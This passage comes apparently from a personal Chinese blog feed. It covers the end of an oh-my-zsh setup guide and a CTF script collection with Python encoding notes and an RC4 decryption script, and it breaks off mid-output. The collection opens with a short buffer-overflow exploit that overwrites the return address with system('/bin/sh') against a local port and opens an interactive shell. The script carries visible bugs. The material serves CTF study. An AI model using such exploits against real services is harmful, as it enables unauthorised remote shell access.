data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sh -c &quot;$(curl -fsSL https://gitee.com/shmhlsy/oh-my-zsh-install.sh/raw/master/install.sh)&quot; #国内镜像源</span><br></pre></td></tr></table></figure></div><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://cdn.nlark.com/yuque/0/2023/png/23148330/1689301278903-d96a34c1-d0af-41bb-a06c-e13dcd065f4e.png#averageHue=%230e0e0d&clientId=uaafdbd30-beee-4&from=paste&height=724&id=u25470fb9&originHeight=905&originWidth=1842&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=94772&status=done&style=none&taskId=u485b5515-1f4e-45c4-9f2e-09a487cbfae&title=&width=1473.6"                      alt="image.png"                ><br />出图，安装成功。<br><a name="u8S58"></a></p><h2 id="4、安装插件"><a href="#4、安装插件" class="headerlink" title="4、安装插件"></a>4、安装插件</h2><p>官方推荐的插件比如：</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#zsh-autosuggestions 命令行命令键入时的历史命令建议</span><br><span class="line">git clone https://github.com/zsh-users/zsh-autosuggestions $&#123;ZSH_CUSTOM:-~/.oh-my-zsh/custom&#125;/plugins/zsh-autosuggestions</span><br><span class="line">#zsh-syntax-highlighting 命令行语法高亮插件</span><br><span class="line">git clone https://gitee.com/Annihilater/zsh-syntax-highlighting.git $&#123;ZSH_CUSTOM:-~/.oh-my-zsh/custom&#125;/plugins/zsh-syntax-highlighting</span><br></pre></td></tr></table></figure></div><p><a name="lhsoT"></a></p><h2 id="5、配置文件-zshrc"><a href="#5、配置文件-zshrc" class="headerlink" title="5、配置文件~&#x2F;.zshrc:"></a>5、配置文件~&#x2F;.zshrc:</h2><p>没什么好讲的，这是我自己的配置文件，直接复制替换原来的.zshrc即可。</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">#防止中文乱码</span><br><span class="line">export LC_ALL=en_US.UTF-8</span><br><span class="line">export LANG=en_US.UTF-8</span><br><span class="line">#oh-my-zsh的安装路径（zsh的配置路径）</span><br><span class="line">ZSH=&quot;/root/.oh-my-zsh&quot;</span><br><span class="line"># ZSH_THEME=&quot;robbyrussell&quot;</span><br><span class="line"># 设置字体模式以及配置命令行的主题</span><br><span class="line">POWERLEVEL9K_MODE=&#x27;nerdfont-complete&#x27;</span><br><span class="line">ZSH_THEME=&quot;agnoster&quot; #我目前使用的模式</span><br><span class="line">#ZSH_THEME=&quot;powerlevel9k/powerlevel9k&quot;</span><br><span class="line"></span><br><span class="line"># 启动错误命令自动更正</span><br><span class="line">ENABLE_CORRECTION=&quot;true&quot;</span><br><span class="line"></span><br><span class="line"># 在命令执行的过程中，使用小红点进行提示</span><br><span class="line">COMPLETION_WAITING_DOTS=&quot;true&quot;</span><br><span class="line"></span><br><span class="line"># 配置要使用的插件</span><br><span class="line">plugins=(</span><br><span class="line">        git</span><br><span class="line">        extract</span><br><span class="line">        zsh-autosuggestions</span><br><span class="line">        zsh-syntax-highlighting</span><br><span class="line">)</span><br><span class="line">source $ZSH/oh-my-zsh.sh</span><br><span class="line">source $ZSH_CUSTOM/plugins/zsh-autosuggestions/zsh-autosuggestions.zsh</span><br><span class="line"># python虚拟环境相关设置</span><br><span class="line">if [ -f /usr/local/bin/virtualenvwrapper.sh ];</span><br><span class="line">then</span><br><span class="line">    export WORKON_HOME=$HOME/.virtualenvs</span><br><span class="line">    export VIRTUALENVWRAPPER_PYTHON=/usr/bin/python3</span><br><span class="line">    source /usr/local/bin/virtualenvwrapper.sh</span><br><span class="line">fi</span><br></pre></td></tr></table></figure></div><p><a name="a0euK"></a></p><h2 id="6-我遇到了命令行提示符乱码的问题"><a href="#6-我遇到了命令行提示符乱码的问题" class="headerlink" title="6.我遇到了命令行提示符乱码的问题"></a>6.我遇到了命令行提示符乱码的问题</h2><p>安装结束后我发现，我的命令行出现了乱码，箭头显示不出来，如下图，这让我这个强迫症异常抓狂。<br /><img                       lazyload                     src="/images/loading.svg"                     data-src="https://cdn.nlark.com/yuque/0/2023/png/23148330/1689302592167-615b94c5-b954-430c-89ae-f166c48190b2.png#averageHue=%231d1c1a&clientId=uf4b8c785-21b4-4&from=paste&height=597&id=u29741f68&originHeight=746&originWidth=1242&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=75421&status=done&style=none&taskId=ud07bb4d0-4cf7-4b3c-99d8-d0f969e661a&title=&width=993.6"                      alt="image.png"                ><br />然后发现是字体的原因，这是通常设置字体的方法</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">wget https://raw.githubusercontent.com/powerline/powerline/develop/font/10-powerline-symbols.conf</span><br><span class="line">wget https://raw.githubusercontent.com/powerline/powerline/develop/font/PowerlineSymbols.otf</span><br><span class="line">sudo mkdir /usr/share/fonts/OTF</span><br><span class="line">sudo cp 10-powerline-symbols.conf /usr/share/fonts/OTF/ </span><br><span class="line">sudo mv 10-powerline-symbols.conf /etc/fonts/conf.d/</span><br><span class="line">sudo mv PowerlineSymbols.otf /usr/share/fonts/OTF/</span><br><span class="line">fc-cache -vf  /usr/share/fonts/OTF/</span><br></pre></td></tr></table></figure></div><p>但是我的ubunt是window下的子系统，所以直接更改终端字体就解决了，更改方法很简单，直接下载对应的字体，直接把字体拖入在个性化里的字体设置中的添加字体即可，（百度查的很详细）<br />我用的是这个字体“MesloLGS NF Regular”</p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;&#92;assets&#92;css&#92;APlayer.min.css&quot;&gt;&lt;script src=&quot;&#92;assets&#92;js&#92;APlayer.min.js&quot; cla</summary>
      
    
    
    
    
    <category term="CTF" scheme="https://juana-2u.github.io/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>脚本整理Ⅰ</title>
    <link href="https://juana-2u.github.io/2024/03/17/%E8%84%9A%E6%9C%AC%E6%95%B4%E7%90%86%E2%85%A0/"/>
    <id>https://juana-2u.github.io/2024/03/17/%E8%84%9A%E6%9C%AC%E6%95%B4%E7%90%86%E2%85%A0/</id>
    <published>2024-03-17T10:35:24.000Z</published>
    <updated>2024-03-17T10:37:06.212Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="pwn脚本收集Ⅰ"><a href="#pwn脚本收集Ⅰ" class="headerlink" title="pwn脚本收集Ⅰ"></a>pwn脚本收集Ⅰ</h2><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">import</span> telnetlib</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">p32</span>(<span class="params">val</span>):</span><br><span class="line">    <span class="comment">#将32位的整数转化为字符串（小端模式）</span></span><br><span class="line">        <span class="keyword">return</span> struct.pack(<span class="string">&quot;&quot;</span>,val)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pwn</span>():</span><br><span class="line">    <span class="comment">#创建一个TCP socket</span></span><br><span class="line">    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">    <span class="comment">#连接服务器端口</span></span><br><span class="line">    s.connect((<span class="string">&quot;127.0.0.1&quot;</span>,<span class="number">8888</span>))</span><br><span class="line">    <span class="comment">#system函数的地址0x080483A0</span></span><br><span class="line">    system_addr = P32(<span class="number">0x080483A0</span>)</span><br><span class="line">    <span class="comment">#/bin/bash字符串的地址0x08048610</span></span><br><span class="line">    binsh_addr = P32(<span class="number">0x08048610</span>)</span><br><span class="line">    <span class="comment">##填充数据</span></span><br><span class="line">    nops = <span class="string">&#x27;A&#x27;</span>*<span class="number">4</span></span><br><span class="line">    <span class="comment">#payload构建</span></span><br><span class="line">    payload = <span class="string">&#x27;A&#x27;</span>*<span class="number">0x88</span> +nops+system_addr+nops+binsh_addr</span><br><span class="line">    <span class="comment">#向服务器发送数据</span></span><br><span class="line">    s.sendall(payload+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    <span class="comment">#创建telnet 产生控制服务器的shell</span></span><br><span class="line">    t = telnetlib.Telnet()</span><br><span class="line">    t.sock = s</span><br><span class="line">    t.interact()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    pwn()</span><br></pre></td></tr></table></figure></div><hr><h3 id="socket字节码（socket通信编码解码）"><a href="#socket字节码（socket通信编码解码）" class="headerlink" title="socket字节码（socket通信编码解码）"></a>socket字节码（socket通信编码解码）</h3><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>）编码：把字符串<span class="built_in">str</span>转换成用于存储或传输的字节序列<span class="built_in">bytes</span></span><br><span class="line"><span class="number">2</span>）解码：把字节序列<span class="built_in">bytes</span>转换成人类可读的文本字符串<span class="built_in">str</span></span><br></pre></td></tr></table></figure></div><p>python3中内置的两种基本数据类型</p><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>）<span class="built_in">str</span> 数据类型----以unicode（万国码）编码存储</span><br><span class="line"><span class="number">2</span>）<span class="built_in">bytes</span> 数据类型----以十六进制形式存储</span><br></pre></td></tr></table></figure></div><p>编码解码的方式</p><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>）<span class="built_in">str</span>&gt;&gt;&gt;<span class="built_in">bytes</span>：编码</span><br><span class="line">方法<span class="number">1</span>:字符串数据.encode(编码规则)</span><br><span class="line">eg：</span><br><span class="line">s=“hello”</span><br><span class="line">bt=s.encode(<span class="string">&quot;utf-8&quot;</span>)  <span class="comment">#采用utf8编码规则将str类型数据转换为byte类型数据</span></span><br><span class="line"></span><br><span class="line">方法<span class="number">2</span>:<span class="built_in">bytes</span>(字符串数据,编码规则)</span><br><span class="line">eg：</span><br><span class="line">s=<span class="string">&quot;hello&quot;</span></span><br><span class="line">bt=<span class="built_in">bytes</span>(s,<span class="string">&quot;utf8&quot;</span>) <span class="comment">#采用utf8编码规则将str类型数据转换为byte类型数据</span></span><br><span class="line"></span><br><span class="line"><span class="number">2</span>）<span class="built_in">bytes</span>&gt;&gt;&gt;<span class="built_in">str</span>：解码</span><br><span class="line">方法<span class="number">1</span>:字符串数据.decode(编码规则)</span><br><span class="line">eg：</span><br><span class="line">bt=<span class="built_in">bytes</span>(<span class="string">&quot;welcome 你&quot;</span>,<span class="string">&quot;utf8&quot;</span>)</span><br><span class="line">s=bt.decode(<span class="string">&quot;utf-8&quot;</span>)  <span class="comment">#采用utf8编码则对应解码也应该采用utf8.否则会出现解码错误情况</span></span><br><span class="line"></span><br><span class="line">方法<span class="number">2</span>:<span class="built_in">str</span>(<span class="built_in">bytes</span>类型数据,编码规则)</span><br><span class="line">eg：</span><br><span class="line">bt=<span class="built_in">bytes</span>(<span class="string">&quot;welcome 你&quot;</span>,<span class="string">&quot;utf8&quot;</span>)</span><br><span class="line">s=<span class="built_in">str</span>(bt,<span class="string">&quot;utf8&quot;</span>) <span class="comment">#采用utf8编码则对应解码也应该采用utf8.否则会出现解码错误情况</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></div><p>例子：</p><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">##UTF-8编码</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>s=<span class="string">&quot;Welcome 你好&quot;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">print</span>(<span class="built_in">type</span>(s))</span><br><span class="line">&lt;<span class="keyword">class</span> <span class="string">&#x27;str&#x27;</span>&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>b = <span class="built_in">bytes</span>(s,<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">print</span>(b)</span><br><span class="line"><span class="string">b&#x27;Welcome \xe4\xbd\xa0\xe5\xa5\xbd&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">##UTF-8解码</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>b1 = s.encode(<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">print</span>(b1)</span><br><span class="line"><span class="string">b&#x27;Welcome \xe4\xbd\xa0\xe5\xa5\xbd&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>new_s = b1.decode(<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">print</span>(new_s)</span><br><span class="line">Welcome 你好</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>new_s1 = <span class="built_in">str</span>(b1,<span class="string">&quot;utf_8&quot;</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">print</span>(new_s1)</span><br><span class="line">Welcome 你好</span><br></pre></td></tr></table></figure></div><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">##GBK编码</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">str</span> = <span class="string">&quot;你好 world&quot;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>new_str = <span class="built_in">bytes</span>(<span class="built_in">str</span>,<span class="string">&quot;gbk&quot;</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">print</span>(<span class="string">&quot;gbk编码方式下的bytes：%s&quot;</span> %new_str)</span><br><span class="line">gbk编码方式下的<span class="built_in">bytes</span>：<span class="string">b&#x27;\xc4\xe3\xba\xc3 world&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>new_str1 = new_str.decode(<span class="string">&quot;gbk&quot;</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">print</span>(<span class="string">&quot;gbk解码后str类型:%s&quot;</span> %new_str1)</span><br><span class="line">gbk解码后<span class="built_in">str</span>类型:你好 world</span><br></pre></td></tr></table></figure></div><h1 id="RC4解密脚本示例"><a href="#RC4解密脚本示例" class="headerlink" title="RC4解密脚本示例"></a>RC4解密脚本示例</h1><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rc4_main</span>(<span class="params">key = <span class="string">&quot;init_key&quot;</span>, message = <span class="string">&quot;init_message&quot;</span></span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;RC4解密主函数调用成功&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    s_box = rc4_init_sbox(key)</span><br><span class="line">    crypt = rc4_excrypt(message, s_box)</span><br><span class="line">    <span class="keyword">return</span> crypt</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rc4_init_sbox</span>(<span class="params">key</span>):</span><br><span class="line">    s_box = <span class="built_in">list</span>(<span class="built_in">range</span>(<span class="number">256</span>))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;原来的 s 盒：%s&quot;</span> % s_box)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    j = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">        j = (j + s_box[i] + <span class="built_in">ord</span>(key[i % <span class="built_in">len</span>(key)])) % <span class="number">256</span></span><br><span class="line">        s_box[i], s_box[j] = s_box[j], s_box[i]</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;混乱后的 s 盒：%s&quot;</span>% s_box)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> s_box</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rc4_excrypt</span>(<span class="params">plain, box</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;调用解密程序成功。&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    plain = base64.b64decode(plain.encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">    plain = <span class="built_in">bytes</span>.decode(plain)</span><br><span class="line">    res = []</span><br><span class="line">    i = j = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> s <span class="keyword">in</span> plain:</span><br><span class="line">        i = (i + <span class="number">1</span>) % <span class="number">256</span></span><br><span class="line">        j = (j + box[i]) % <span class="number">256</span></span><br><span class="line">        box[i], box[j] = box[j], box[i]</span><br><span class="line">        t = (box[i] + box[j]) % <span class="number">256</span></span><br><span class="line">        k = box[t]</span><br><span class="line">        res.append(<span class="built_in">chr</span>(<span class="built_in">ord</span>(s) ^ k))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;res用于解密字符串，解密后是：%res&quot;</span> %res)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    cipher = <span class="string">&quot;&quot;</span>.join(res)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;解密后的字符串是：%s&quot;</span> %cipher)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;解密后的输出(没经过任何编码):&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> cipher</span><br><span class="line">a=[] <span class="comment">#cipher</span></span><br><span class="line">key=<span class="string">&quot;flag&#123;123321321123badbeef012&#125;&quot;</span></span><br><span class="line">s=<span class="string">&quot;\x1d\xc5\x80_\xe7\x0cX\x06\xb1\x9e\x1d=x?\x85v\xa6\x97\x89\x0f\xe2\x8c\x84U\xc6[\xc4V\x02\xbb\xf2\xbaq\xa3\x16\xc1x\xa6!\xa7\x04\x96)&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> a:</span><br><span class="line">    s+=<span class="built_in">chr</span>(i)</span><br><span class="line">s=<span class="built_in">str</span>(base64.b64encode(s.encode(<span class="string">&#x27;utf-8&#x27;</span>)), <span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">rc4_main(key, s)</span><br><span class="line"></span><br><span class="line"><span class="comment">##result</span></span><br><span class="line">D:\CollegeStudy\Python_code\venv\Scripts\python.exe D:/CTF_Tools/0_CTF_Scripts/BuuCTF_Test/erefinal.py</span><br><span class="line">RC4解密主函数调用成功</span><br><span class="line"></span><br><span class="line">原来的 s 盒：[<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">12</span>, <span class="number">13</span>, <span class="number">14</span>, <span class="number">15</span>, <span class="number">16</span>, <span class="number">17</span>, <span class="number">18</span>, <span class="number">19</span>, <span class="number">20</span>, <span class="number">21</span>, <span class="number">22</span>, <span class="number">23</span>, <span class="number">24</span>, <span class="number">25</span>, <span class="number">26</span>, <span class="number">27</span>, <span class="number">28</span>, <span class="number">29</span>, <span class="number">30</span>, <span class="number">31</span>, <span class="number">32</span>, <span class="number">33</span>, <span class="number">34</span>, <span class="number">35</span>, <span class="number">36</span>, <span class="number">37</span>, <span class="number">38</span>, <span class="number">39</span>, <span class="number">40</span>, <span class="number">41</span>, <span class="number">42</span>, <span class="number">43</span>, <span class="number">44</span>, <span class="number">45</span>, <span class="number">46</span>, <span class="number">47</span>, <span class="number">48</span>, <span class="number">49</span>, <span class="number">50</span>, <span class="number">51</span>, <span class="number">52</span>, <span class="number">53</span>, <span class="number">54</span>, <span class="number">55</span>, <span class="number">56</span>, <span class="number">57</span>, <span class="number">58</span>, <span class="number">59</span>, <span class="number">60</span>, <span class="number">61</span>, <span class="number">62</span>, <span class="number">63</span>, <span class="number">64</span>, <span class="number">65</span>, <span class="number">66</span>, <span class="number">67</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">70</span>, <span class="number">71</span>, <span class="number">72</span>, <span class="number">73</span>, <span class="number">74</span>, <span class="number">75</span>, <span class="number">76</span>, <span class="number">77</span>, <span class="number">78</span>, <span class="number">79</span>, <span class="number">80</span>, <span class="number">81</span>, <span class="number">82</span>, <span class="number">83</span>, <span class="number">84</span>, <span class="number">85</span>, <span class="number">86</span>, <span class="number">87</span>, <span class="number">88</span>, <span class="number">89</span>, <span class="number">90</span>, <span class="number">91</span>, <span class="number">92</span>, <span class="number">93</span>, <span class="number">94</span>, <span class="number">95</span>, <span class="number">96</span>, <span class="number">97</span>, <span class="number">98</span>, <span class="number">99</span>, <span class="number">100</span>, <span class="number">101</span>, <span class="number">102</span>, <span class="number">103</span>, <span class="number">104</span>, <span class="number">105</span>, <span class="number">106</span>, <span class="number">107</span>, <span class="number">108</span>, <span class="number">109</span>, <span class="number">110</span>, <span class="number">111</span>, <span class="number">112</span>, <span class="number">113</span>, <span class="number">114</span>, <span class="number">115</span>, <span class="number">116</span>, <span class="number">117</span>, <span class="number">118</span>, <span class="number">119</span>, <span class="number">120</span>, <span class="number">121</span>, <span class="number">122</span>, <span class="number">123</span>, <span class="number">124</span>, <span class="number">125</span>, <span class="number">126</span>, <span class="number">127</span>, <span class="number">128</span>, <span class="number">129</span>, <span class="number">130</span>, <span class="number">131</span>, <span class="number">132</span>, <span class="number">133</span>, <span class="number">134</span>, <span class="number">135</span>, <span class="number">136</span>, <span class="number">137</span>, <span class="number">138</span>, <span class="number">139</span>, <span class="number">140</span>, <span class="number">141</span>, <span class="number">142</span>, <span class="number">143</span>, <span class="number">144</span>, <span class="number">145</span>, <span class="number">146</span>, <span class="number">147</span>, <span class="number">148</span>, <span class="number">149</span>, <span class="number">150</span>, <span class="number">151</span>, <span class="number">152</span>, <span class="number">153</span>, <span class="number">154</span>, <span class="number">155</span>, <span class="number">156</span>, <span class="number">157</span>, <span class="number">158</span>, <span class="number">159</span>, <span class="number">160</span>, <span class="number">161</span>, <span class="number">162</span>, <span class="number">163</span>, <span class="number">164</span>, <span class="number">165</span>, <span class="number">166</span>, <span class="number">167</span>, <span class="number">168</span>, <span class="number">169</span>, <span class="number">170</span>, <span class="number">171</span>, <span class="number">172</span>, <span class="number">173</span>, <span class="number">174</span>, <span class="number">175</span>, <span class="number">176</span>, <span class="number">177</span>, <span class="number">178</span>, <span class="number">179</span>, <span class="number">180</span>, <span class="number">181</span>, <span class="number">182</span>, <span class="number">183</span>, <span class="number">184</span>, <span class="number">185</span>, <span class="number">186</span>, <span class="number">187</span>, <span class="number">188</span>, <span class="number">189</span>, <span class="number">190</span>, <span class="number">191</span>, <span class="number">192</span>, <span class="number">193</span>, <span class="number">194</span>, <span class="number">195</span>, <span class="number">196</span>, <span class="number">197</span>, <span class="number">198</span>, <span class="number">199</span>, <span class="number">200</span>, <span class="number">201</span>, <span class="number">202</span>, <span class="number">203</span>, <span class="number">204</span>, <span class="number">205</span>, <span class="number">206</span>, <span class="number">207</span>, <span class="number">208</span>, <span class="number">209</span>, <span class="number">210</span>, <span class="number">211</span>, <span class="number">212</span>, <span class="number">213</span>, <span class="number">214</span>, <span class="number">215</span>, <span class="number">216</span>, <span class="number">217</span>, <span class="number">218</span>, <span class="number">219</span>, <span class="number">220</span>, <span class="number">221</span>, <span class="number">222</span>, <span class="number">223</span>, <span class="number">224</span>, <span class="number">225</span>, <span class="number">226</span>, <span class="number">227</span>, <span class="number">228</span>, <span class="number">229</span>, <span class="number">230</span>, <span class="number">231</span>, <span class="number">232</span>, <span class="number">233</span>, <span class="number">234</span>, <span class="number">235</span>, <span class="number">236</span>, <span class="number">237</span>, <span class="number">238</span>, <span class="number">239</span>, <span class="number">240</span>, <span class="number">241</span>, <span class="number">242</span>, <span class="number">243</span>, <span class="number">244</span>, <span class="number">245</span>, <span class="number">246</span>, <span class="number">247</span>, <span class="number">248</span>, <span class="number">249</span>, <span class="number">250</span>, <span class="number">251</span>, <span class="number">252</span>, <span class="number">253</span>, <span class="number">254</span>, <span class="number">255</span>]</span><br><span class="line"></span><br><span class="line">混乱后的 s 盒：[<span class="number">77</span>, <span class="number">211</span>, <span class="number">134</span>, <span class="number">160</span>, <span class="number">149</span>, <span class="number">85</span>, <span class="number">141</span>, <span class="number">43</span>, <span class="number">217</span>, <span class="number">61</span>, <span class="number">105</span>, <span class="number">55</span>, 